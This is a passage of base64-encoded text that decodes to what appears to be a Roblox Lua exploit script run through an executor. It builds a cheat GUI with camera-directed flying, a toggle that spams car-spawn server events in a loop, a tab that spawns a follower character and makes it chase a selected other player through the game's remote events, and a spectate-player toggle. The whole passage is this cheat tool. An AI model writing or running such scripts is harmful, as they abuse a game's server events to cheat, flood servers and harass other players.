HVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICogU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAqIFNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgKiBTcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICogU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAqIDAKZW5kKQoKVy5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKCWxvY2FsIEh1bWFub2lkUlAgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAqIFNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgKiBTcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICogU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAqIFNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgKiBTcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICogU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAqIFNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgKiBTcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICogU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAqIFNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgKiAwCmVuZCkKClMuTmFtZSA9ICJTIgpTLlBhcmVudCA9IEZseW9uClMuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDE1MCwgMTkxKQpTLkJvcmRlclNpemVQaXhlbCA9IDAKUy5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjEzNDAwMDAwMywgMCwgMC40Nzk5OTk5ODksIDApClMuUm90YXRpb24gPSAxODAuMDAwClMuU2l6ZSA9IFVEaW0yLm5ldygwLjcwODk5OTk5MSwgMCwgMC40OTkwMDAwMTMsIDApClMuRm9udCA9IEVudW0uRm9udC5Tb3VyY2VTYW5zClMuVGV4dCA9ICJeIgpTLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQpTLlRleHRTY2FsZWQgPSB0cnVlClMuVGV4dFNpemUgPSAxNC4wMDAKUy5UZXh0V3JhcHBlZCA9IHRydWUKUy5Ub3VjaExvbmdQcmVzczpDb25uZWN0KGZ1bmN0aW9uKCkKCWxvY2FsIEh1bWFub2lkUlAgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAqIC1TcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICogLVNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgKiAtU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAqIC1TcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICogLVNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgKiAtU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAqIC1TcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICogLVNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgKiAtU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAqIC1TcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICogMAplbmQpCgpTLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQoJbG9jYWwgSHVtYW5vaWRSUCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAqIC1TcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICogLVNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgKiAtU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAqIC1TcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICogLVNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgKiAtU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAqIC1TcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICogLVNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgKiAtU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAqIDAKZW5kKQogICAgZW5kCn0pCgotLSBTcGFtIENhcnMgU2VjdGlvbgpsb2NhbCBTcGFtQ2FyU2VjdGlvbiA9IENhclRhYjpBZGRTZWN0aW9uKHsi8J+amO+4sVNwYW0gQ2FycyJ9KQoKbG9jYWwgY2FyTGlzdCA9IHsKICAgICJTY2hvb2xCdXMiLCAiU21hcnRDYXIiLCAiRmFybVRydWNrIiwgIkNhZGlsbGFjIiwgIkV4Y2F2YXRvciIsCiAgICAiSmVlcCIsICJOYXNjYXJUcnVjayIsICJUb3dUcnVjayIsICJTbm93cGxvdyIsICJNaWxpdGFyeVRydWNrIiwKICAgICJUYW5rIiwgIkxpbW8iLCAiRmlyZVRydWNrIgp9Cgpsb2NhbCBzcGFtQ2Fyc0FjdGl2ZSA9IGZhbHNlCgpsb2NhbCBmdW5jdGlvbiBzcGF3bkNhcihjYXJOYW1lKQogICAgbG9jYWwgYXJncyA9IHsKICAgICAgICBbMV0gPSAiUGlja2luZ0NhciIsCiAgICAgICAgWzJdID0gY2FyTmFtZQogICAgfQogICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOldhaXRGb3JDaGlsZCgiUkUiKTpXYWl0Rm9yQ2hpbGQoIjFDYTFyIik6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCmVuZAoKQ2FyVGFiOkFkZFBhcmFncmFwaCh7IuKaoO+4j++4sUluZm9ybWF0aW9uOiIsICJTcGFtIG11bHRpcGxlIGNhcnMuIn0pCgpDYXJUYWI6QWRkVG9nZ2xlKHsKICAgIE5hbWUgPSAiU3BhbSBDYXJzIiwKICAgIERlZmF1bHQgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgc3BhbUNhcnNBY3RpdmUgPSBzdGF0ZQogICAgICAgIGlmIHNwYW1DYXJzQWN0aXZlIHRoZW4KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBzcGFtQ2Fyc0FjdGl2ZSBkbwogICAgICAgICAgICAgICAgICAgIGZvciBfLCBjYXJOYW1lIGluIGlwYWlycyhjYXJMaXN0KSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgc3BhbUNhcnNBY3RpdmUgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgc3Bhd25DYXIoY2FyTmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgwLjQpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kCn0pCgoKLS0gR2xvYmFsIHZhcmlhYmxlcwpsb2NhbCBwbCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBwbGF5ZXJzID0ge30KCi0tIEZ1bmN0aW9uIHRvIHVwZGF0ZSB0aGUgcGxheWVyIGxpc3QKbG9jYWwgZnVuY3Rpb24gdXBkYXRlUGxheWVyTGlzdCgpCiAgICBwbGF5ZXJzID0ge30KICAgIGZvciBfLCBwbGF5ZXIgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICB0YWJsZS5pbnNlcnQocGxheWVycywgcGxheWVyLk5hbWUpCiAgICBlbmQKICAgIHJldHVybiBwbGF5ZXJzCmVuZAoKLS0gSW5pdGlhbGl6ZXMgdGhlIHBsYXllciBsaXN0CnVwZGF0ZVBsYXllckxpc3QoKQoKLS0gQ2hpbGQgVGFiCmxvY2FsIENoaWxkVGFiID0gV2luZG93Ok1ha2VUYWIoeyLvuLFDaGlsZCIsICJyYnhhc3NldGlkOi8vMTA1OTc2MTA3OTc3ODI5In0pCgpsb2NhbCBTZWN0aW9uID0gQ2hpbGRUYWI6QWRkU2VjdGlvbih7CiAgICBOYW1lID0gIvCfkbbvuLFDaGlsZCIKfSkKCmxvY2FsIGNoYXNpbmdwbGF5ZXIgPSBuaWwKbG9jYWwgcGxheWVyQ2hpbGQgPSBDaGlsZFRhYjpBZGREcm9wZG93bih7CiAgICBOYW1lID0gIkNob29zZSBhIHBsYXllciB0byBjaGFzZToiLAogICAgT3B0aW9ucyA9IHBsYXllcnMsCiAgICBEZWZhdWx0ID0gIiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHNlbGVjdGVkKQogICAgICAgIGlmIGdhbWUuUGxheWVyczpGaW5kRmlyc3RDaGlsZChzZWxlY3RlZCkgdGhlbgogICAgICAgICAgICBjaGFzaW5ncGxheWVyID0gc2VsZWN0ZWQKICAgICAgICBlbHNlCiAgICAgICAgICAgIGNoYXNpbmdwbGF5ZXIgPSBuaWwKICAgICAgICBlbmQKICAgIGVuZAp9KQoKQ2hpbGRUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiUmVzZXQgcGxheWVyIGxpc3QiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgdXBkYXRlZFBsYXllcnMgPSB1cGRhdGVQbGF5ZXJMaXN0KCkKICAgICAgICBpZiBwbGF5ZXJDaGlsZCBhbmQgdXBkYXRlZFBsYXllcnMgdGhlbgogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBwbGF5ZXJDaGlsZDpSZWZyZXNoKHVwZGF0ZWRQbGF5ZXJzKQogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIGlmIGNoYXNpbmdwbGF5ZXIgYW5kIG5vdCBnYW1lLlBsYXllcnM6RmluZEZpcnN0Q2hpbGQoY2hhc2luZ3BsYXllcikgdGhlbgogICAgICAgICAgICAgICAgY2hhc2luZ3BsYXllciA9IG5pbAogICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIHBsYXllckNoaWxkOlNldCgiIikKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIFBsYXllciBqb2luL2xlYXZlIGV2ZW50cwpnYW1lLlBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICB0YXNrLndhaXQoMC4xKQogICAgbG9jYWwgdXBkYXRlZFBsYXllcnMgPSB1cGRhdGVQbGF5ZXJMaXN0KCkKICAgIGlmIHBsYXllckNoaWxkIGFuZCB1cGRhdGVkUGxheWVycyB0aGVuCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBwbGF5ZXJDaGlsZDpSZWZyZXNoKHVwZGF0ZWRQbGF5ZXJzKQogICAgICAgIGVuZCkKICAgIGVuZAplbmQpCgpnYW1lLlBsYXllcnMuUGxheWVyUmVtb3Zpbmc6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpCiAgICB0YXNrLndhaXQoMC4xKQogICAgbG9jYWwgdXBkYXRlZFBsYXllcnMgPSB1cGRhdGVQbGF5ZXJMaXN0KCkKICAgIGlmIHBsYXllckNoaWxkIGFuZCB1cGRhdGVkUGxheWVycyB0aGVuCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBwbGF5ZXJDaGlsZDpSZWZyZXNoKHVwZGF0ZWRQbGF5ZXJzKQogICAgICAgIGVuZCkKICAgICAgICBpZiBjaGFzaW5ncGxheWVyID09IHBsYXllci5OYW1lIHRoZW4KICAgICAgICAgICAgY2hhc2luZ3BsYXllciA9IG5pbAogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBwbGF5ZXJDaGlsZDpTZXQoIiIpCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpDaGlsZFRhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJTZW5kIGNoaWxkIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGlmIG5vdCBjaGFzaW5ncGxheWVyIHRoZW4KICAgICAgICAgICAgd2FybigiTm8gcGxheWVyIHNlbGVjdGVkISIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAogICAgICAgIGlmIG5vdCB3b3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQocGwuTmFtZSkgb3Igbm90IHdvcmtzcGFjZVtwbC5OYW1lXTpGaW5kRmlyc3RDaGlsZCgiRm9sbG93Q2hhcmFjdGVyIikgdGhlbgogICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgWzFdID0gIkNoYXJhY3RlckZvbGxvd1NwYXduUGxheWVyIiwKICAgICAgICAgICAgICAgIFsyXSA9ICJCYWJ5Qm95IgogICAgICAgICAgICB9CiAgICAgICAgICAgIGxvY2FsIHN1Y2Nlc3MsIGVyciA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMUJhYjF5Rm9sbG8xdyIpOkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIGlmIG5vdCBzdWNjZXNzIHRoZW4KICAgICAgICAgICAgICAgIHdhcm4oIuKdjO+4sUZhaWxlZCB0byBzZW5kaW5nIGNoaWxkOiAiIC4uIGVycikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICAKICAgICAgICBpZiB3b3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQocGwuTmFtZSkgdGhlbgogICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyh3b3Jrc3BhY2VbcGwuTmFtZV06R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgIGlmIHY6SXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICB2LkNhbkNvbGxpZGUgPSB0cnVlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIHRhcmdldCA9IGNoYXNpbmdwbGF5ZXIKICAgICAgICBpZiB3b3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQodGFyZ2V0KSBhbmQgd29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKHBsLk5hbWUpIGFuZCB3b3Jrc3BhY2VbcGwuTmFtZV06RmluZEZpcnN0Q2hpbGQoIkZvbGxvd0NoYXJhY3RlciIpIHRoZW4KICAgICAgICAgICAgd29ya3NwYWNlW3BsLk5hbWVdLkZvbGxvd0NoYXJhY3Rlci5QYXJlbnQgPSB3b3Jrc3BhY2VbdGFyZ2V0XQoKICAgICAgICAgICAgaWYgcmF3Z2V0KGdldGdlbnYoKSwgIlJ1blNlcnZpY2UiKSB0aGVuCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBnZXRnZW52KCkuUnVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGxvY2FsIGZvbGxvd0NoYXJhY3RlciA9IHdvcmtzcGFjZVt0YXJnZXRdOkZpbmRGaXJzdENoaWxkKCJGb2xsb3dDaGFyYWN0ZXIiKQogICAgICAgICAgICAgICAgaWYgZm9sbG93Q2hhcmFjdGVyIGFuZCBmb2xsb3dDaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlRvcnNvIikgYW5kIGZvbGxvd0NoYXJhY3Rlci5Ub3JzbzpGaW5kRmlyc3RDaGlsZCgiQm9keVBvc2l0aW9uIikgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGh1bWFub2lkUm9vdFBhcnQgPSB3b3Jrc3BhY2VbdGFyZ2V0XTpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICAgICAgaWYgaHVtYW5vaWRSb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGZvbGxvd0NoYXJhY3Rlci5Ub3Jzby5Cb2R5UG9zaXRpb24uUG9zaXRpb24gPSBodW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uIC0gKGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lLkxvb2tWZWN0b3IgKiAzKQogICAgICAgICAgICAgICAgICAgICAgICBmb2xsb3dDaGFyYWN0ZXIuVG9yc28uQm9keUd5cm8uQ0ZyYW1lID0gaHVtYW5vaWRSb290UGFydC5DRnJhbWUKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCkNoaWxkVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIlJldHVybiBjaGlsZCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBpZiByYXdnZXQoZ2V0Z2VudigpLCAiUnVuU2VydmljZSIpIHRoZW4KICAgICAgICAgICAgZ2V0Z2VudigpLlJ1blNlcnZpY2U6RGlzY29ubmVjdCgpCiAgICAgICAgICAgIGdldGdlbnYoKS5SdW5TZXJ2aWNlID0gbmlsCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIGFyZ3MgPSB7IFsxXSA9ICJEZWxldGVGb2xsb3dDaGFyYWN0ZXIiIH0KICAgICAgICBsb2NhbCBzdWNjZXNzLCBlcnIgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMUJhYjF5Rm9sbG8xdyIpOkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgIGVuZCkKICAgICAgICBpZiBub3Qgc3VjY2VzcyB0aGVuCiAgICAgICAgICAgIHdhcm4oIuKdjO+4sUZhaWxlZCByZXR1cm5pbmcgY2hpbGQ6ICIgLi4gZXJyKQogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBhcmdzMSA9IHsgWzFdID0gIkNoYXJhY3RlckZvbGxvd1NwYXduUGxheWVyIiwgWzJdID0gIkJhYnlCb3kiIH0KICAgICAgICBzdWNjZXNzLCBlcnIgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMUJhYjF5Rm9sbG8xdyIpOkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MxKSkKICAgICAgICBlbmQpCiAgICAgICAgaWYgbm90IHN1Y2Nlc3MgdGhlbgogICAgICAgICAgICB3YXJuKCLinYzvuLFGYWlsZWQgc3Bhd25pbmcgY2hpbGQ6ICIgLi4gZXJyKQogICAgICAgIGVuZAogICAgZW5kCn0pCgpDaGlsZFRhYjpBZGRUb2dnbGUoewogICAgTmFtZSA9ICJWaWV3IHBsYXllciIsCiAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIGxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQogICAgICAgIGxvY2FsIFJ1blNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKQogICAgICAgIGxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIENhbWVyYSA9IHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhCgogICAgICAgIGlmIFZhbHVlIHRoZW4KICAgICAgICAgICAgaWYgbm90IGNoYXNpbmdwbGF5ZXIgdGhlbgogICAgICAgICAgICAgICAgd2FybigiTm8gcGxheWVyIHNlbGVjdGVkIHRvIHNwZWN0YXRlISIpCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2UKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBpZiBub3QgcmF3Z2V0KGdldGdlbnYoKSwgIkNhbWVyYUNvbm5lY3Rpb24iKSB0aGVuCiAgICAgICAgICAgICAgICBnZXRnZW52KCkuQ2FtZXJhQ29ubmVjdGlvbiA9IFJ1blNlcnZpY2UuSGVhcnRiZWF0OkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFBsYXllciA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoY2hhc2luZ3BsYXllcikKICAgICAgICAgICAgICAgICAgICBpZiB0YXJnZXRQbGF5ZXIgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXIgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IHRhcmdldFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQKICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHJhd2dldChnZXRnZW52KCksICJDYW1lcmFDb25uZWN0aW9uIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2V0Z2VudigpLkNhbWVyYUNvbm5lY3Rpb246RGlzY29ubmVjdC